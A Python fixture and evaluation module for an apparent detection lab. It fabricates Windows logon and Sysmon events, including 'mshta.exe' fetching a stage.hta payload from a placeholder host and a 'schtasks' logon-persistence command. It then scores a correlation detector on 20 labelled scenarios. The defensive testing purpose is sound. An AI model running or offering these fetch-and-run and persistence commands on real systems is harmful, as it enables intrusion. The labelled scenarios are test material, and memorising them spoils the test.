"""Auditable inert scenario fixtures. Labels are read only by the evaluator."""

from copy import deepcopy
from datetime import datetime, timedelta, timezone
import hashlib
import json
from pathlib import Path
import uuid

from .events import normalize_event
from .investigation import investigate, risk_reason, is_security, is_sysmon
from .detections import seconds


def sample_events():
    logon = "{"+str(uuid.uuid5(uuid.NAMESPACE_DNS, "soclab.session"))+"}"
    process = ["{"+str(uuid.uuid5(uuid.NAMESPACE_DNS, "soclab.process."+str(i)))+"}" for i in range(3)]
    records = []
    def event(t, eid, data, security=False):
        records.append({"timestamp": (datetime(2026,9,3,10,tzinfo=timezone.utc)+timedelta(seconds=t)).isoformat().replace('+00:00','Z'),
                        "host": "WS-CHAIN-LAB", "channel": "Security" if security else "Microsoft-Windows-Sysmon/Operational",
                        "provider": "Microsoft-Windows-Security-Auditing" if security else "Microsoft-Windows-Sysmon",
                        "event_id": eid, "record_id": 100+t, "event_data": data,
                        "provenance": {"kind": "synthetic", "generator": "soclab.corpus.sample_events; no commands executed"}})
    identity = {"TargetUserName":"analyst.lab", "TargetDomainName":"LAB", "IpAddress":"192.0.2.20", "LogonType":"3"}
    for t in range(5): event(t,4625,{**identity,"Status":"0xc000006d","SubStatus":"0xc000006a"},True)
    event(5,4624,{**identity,"LogonGuid":logon,"TargetLogonId":"0x42"},True)
    common = {"User":"LAB\\analyst.lab","LogonGuid":logon,"LogonId":"0x42"}
    event(6,1,{**common,"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta","ProcessGuid":process[0],"ParentProcessGuid":"{00000000-0000-0000-0000-000000000000}","ProcessId":"4000"})
    event(7,1,{**common,"Image":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta.exe https://payload.example.invalid/stage.hta","ProcessGuid":process[1],"ParentProcessGuid":process[0],"ProcessId":"4001"})
    event(8,3,{"Image":"C:\\Windows\\System32\\mshta.exe","ProcessGuid":process[1],"DestinationIp":"198.51.100.20","DestinationPort":"443","Initiated":"true","Protocol":"tcp"})
    event(9,1,{**common,"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"","ProcessGuid":process[2],"ParentProcessGuid":process[1],"ProcessId":"4002"})
    event(10,4698,{"SubjectUserName":"analyst.lab","SubjectDomainName":"LAB","SubjectLogonId":"0x42","TaskName":"\\LabUpdater","TaskContent":"<Task><Actions><Exec><Command>mshta.exe</Command></Exec></Actions></Task>"},True)
    return records


def scenarios():
    # Predeclared review labels describe the constructed intent, not inferred truth.
    specs = [
        ("D01","dev",True,"complete","Full observable chain requiring review"),
        ("D02","dev",True,"powershell","Encoded host argument in the same session"),
        ("D03","dev",False,"different-host","Same names/GUID text on different hosts must not join"),
        ("D04","dev",False,"different-user","Process belongs to another account"),
        ("D05","dev",False,"different-domain","Same account name in another domain"),
        ("D06","dev",False,"different-session","Valid different logon GUID"),
        ("D07","dev",False,"late","Process activity outside declared window"),
        ("D08","dev",False,"no-failures","Only normal successful authentication"),
        ("D09","dev",False,"file-argument","Encoded marker after -File is a script argument"),
        ("D10","dev",False,"different-ip","Failures and success come from different IPs"),
        ("D11","dev",True,"no-network","Known constructed attack intent; connection telemetry omitted"),
        ("D12","dev",False,"authorized-admin","Known approved test; identical observable chain is ambiguous"),
        ("H01","holdout",True,"reordered","Shuffled input lines, chronological evidence unchanged"),
        ("H02","holdout",True,"duplicate","Overlapping export observations must not inflate evidence"),
        ("H03","holdout",True,"zero-guid","Known constructed attack intent; success GUID unavailable"),
        ("H04","holdout",True,"no-task","Known constructed attack intent; descendant event omitted"),
        ("H05","holdout",False,"authorized-admin","Approved full-chain test remains a false positive"),
        ("H06","holdout",False,"orphan","Same session, task parent never observed"),
        ("H07","holdout",False,"changed-logon-id","GUID copied but explicit logon IDs conflict"),
        ("H08","holdout",False,"spoof-provider","Provider does not establish Sysmon telemetry"),
    ]
    result=[]
    for identifier,split,label,variant,rationale in specs:
        events=deepcopy(sample_events())
        if variant=="powershell":
            for e in events:
                if e['event_id']==1 and e['record_id']==107:
                    e['event_data'].update(Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",CommandLine="powershell.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQBiACcA")
        if variant in ("different-host","different-user","different-domain","different-session","changed-logon-id","spoof-provider"):
            for e in events:
                if e['provider']=="Microsoft-Windows-Sysmon":
                    d=e['event_data']
                    if variant=="different-host":e['host']='OTHER-WS'
                    if variant=="different-user" and 'User' in d:d['User']='LAB\\other.lab'
                    if variant=="different-domain" and 'User' in d:d['User']='OTHER\\analyst.lab'
                    if variant=="different-session" and 'LogonGuid' in d:d['LogonGuid']='{11111111-1111-1111-1111-111111111111}'
                    if variant=="changed-logon-id" and 'LogonId' in d:d['LogonId']='0x99'
                    if variant=="spoof-provider":e['provider']='Unknown-Provider'
        if variant=='late':
            for e in events:
                if e['provider']=='Microsoft-Windows-Sysmon':e['timestamp']='2026-09-03T11:00:'+str(e['record_id']-100).zfill(2)+'Z'
        if variant=='no-failures':events=[e for e in events if e['event_id']!=4625]
        if variant=='file-argument':
            e=next(e for e in events if e['record_id']==107)
            e['event_data'].update(Image='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',CommandLine='powershell.exe -File C:\\Lab\\backup.ps1 -EncodedCommand inert')
        if variant=='different-ip':events[5]['event_data']['IpAddress']='192.0.2.21'
        if variant=='no-network':events=[e for e in events if e['event_id']!=3]
        if variant=='no-task':events=[e for e in events if e['record_id']!=109]
        if variant=='zero-guid':events[5]['event_data']['LogonGuid']='{00000000-0000-0000-0000-000000000000}'
        if variant=='orphan':next(e for e in events if e['record_id']==109)['event_data']['ParentProcessGuid']='{22222222-2222-2222-2222-222222222222}'
        if variant=='reordered':events=list(reversed(events))
        if variant=='duplicate':events=events+deepcopy(events)
        result.append({'id':identifier,'split':split,'expected_review':label,'variant':variant,'rationale':rationale,'events':events})
    return result


def normalize_scenario(records):
    # Separate channel files; the explicit scope authorizes only this fixture.
    groups={}
    for e in records:groups.setdefault(e['provider']+' / '+e['channel'],[]).append(e)
    normalized=[]; hashes=[]
    for group in groups.values():
        digest=hashlib.sha256(json.dumps(group,sort_keys=True).encode()).hexdigest();hashes.append(digest)
        normalized.extend(normalize_event(e,digest,i+1) for i,e in enumerate(group))
    return normalized, {'id':'isolated-corpus-scenario','collection_reason':'Channels generated together for one isolated labeled experiment','source_sha256':hashes}


def temporal_baseline(events):
    """Deliberately weak ablation: username/time only. This is not the v1 engine."""
    for success in events:
        if not is_security(success,4624):continue
        name=success['event_data'].get('TargetUserName','').casefold()
        failures=[e for e in events if is_security(e,4625) and e['event_data'].get('TargetUserName','').casefold()==name and 0<=seconds(success)-seconds(e)<=600]
        if len(failures)>=5 and any(is_sysmon(e,1) and risk_reason(e) and e['event_data'].get('User','').rsplit('\\',1)[-1].casefold()==name and 0<=seconds(e)-seconds(success)<=900 for e in events):return True
    return False


def metrics(rows, field):
    counts={k:0 for k in ('tp','fp','tn','fn')}
    for row in rows:
        truth=row['expected_review'];prediction=row[field]
        counts['tp' if truth and prediction else 'fn' if truth else 'fp' if prediction else 'tn']+=1
    tp,fp,fn=counts['tp'],counts['fp'],counts['fn']
    return {**counts,'precision':tp/(tp+fp) if tp+fp else None,'recall':tp/(tp+fn) if tp+fn else None,'f1':2*tp/(2*tp+fp+fn) if 2*tp+fp+fn else None}


def evaluate(corpus_directory=None):
    corpus_directory = Path(corpus_directory) if corpus_directory else Path(__file__).resolve().parents[1]/'data/corpus'
    inventory=json.loads((corpus_directory/'manifest.json').read_text(encoding='utf-8'))
    cases=[];seen=set()
    for entry in inventory['cases']:
        path=corpus_directory/(entry['id']+'.json')
        if hashlib.sha256(path.read_bytes()).hexdigest()!=entry['sha256']:raise ValueError('corpus checksum mismatch: '+entry['id'])
        case=json.loads(path.read_text(encoding='utf-8'))
        if case['id'] in seen or case['id']!=entry['id'] or case['split']!=entry['split'] or type(case['expected_review']) is not bool:
            raise ValueError('invalid or overlapping corpus identity/split/label')
        seen.add(case['id']);cases.append(case)
    if len(cases)!=20 or sum(c['split']=='dev' for c in cases)!=12 or sum(c['split']=='holdout' for c in cases)!=8:
        raise ValueError('corpus needs the declared 12 development and 8 holdout scenarios')
    rows=[]
    for case in cases:
        events,scope=normalize_scenario(case['events'])
        result=investigate(events,scope)
        rows.append({k:case[k] for k in ('id','split','variant','expected_review','rationale')} | {
            'predicted_review':bool(result['chains']),'temporal_baseline':temporal_baseline(events),
            'event_count':len(events),'chain_count':len(result['chains']), 'source_sha256':scope['source_sha256'],
            'missing':[c['missing'] for c in result['candidates'] if not c['complete']]})
    return {'schema_version':1,'engine_sha256':hashlib.sha256((Path(__file__).parent/'investigation.py').read_bytes()).hexdigest(),
            'corpus_manifest_sha256':hashlib.sha256((corpus_directory/'manifest.json').read_bytes()).hexdigest(),
            'unit':'scenario-level need-for-review on constructed intent labels',
            'scope':'20 synthetic scenarios, 12 development / 8 held-out variants. Not field precision/recall; related template families and small sample limit generalization. Holdout is versioned public evidence, not a secret benchmark.',
            'baseline_description':'Username/time-only correlation ablation; not the released v1 detector',
            'selection':'Fixed threshold 5, auth window 600s, chain window 900s declared before evaluation. No threshold optimization on holdout.',
            'metrics':{split:{'identity_graph':metrics([r for r in rows if r['split']==split],'predicted_review'),'temporal_baseline':metrics([r for r in rows if r['split']==split],'temporal_baseline')} for split in ('dev','holdout')},
            'rows':rows}


def write_evaluation(output):
    result=evaluate();output=Path(output)
    output.parent.mkdir(parents=True,exist_ok=True)
    output.write_text(json.dumps(result,indent=2)+'\n',encoding='utf-8',newline='\n')
    return result
